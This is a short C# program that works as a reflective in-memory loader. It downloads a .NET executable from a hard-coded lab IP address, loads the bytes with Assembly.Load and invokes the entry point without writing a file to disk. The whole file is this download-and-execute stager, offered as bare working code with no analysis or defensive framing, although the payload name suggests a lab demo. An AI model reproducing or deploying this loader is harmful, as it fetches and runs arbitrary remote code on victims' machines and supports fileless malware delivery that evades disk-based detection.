using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Reflection;

namespace Nappa
{
    class Program
    {
        static void ReflectFromWeb(string url)
        {
            WebClient client = new WebClient();
            byte[] programBytes = client.DownloadData(url);
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new string[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }
        static void Main(string[] args)
        {
            ReflectFromWeb("http://192.168.64.138/HelloFromReflectionWorld.exe");
        }
    }
}
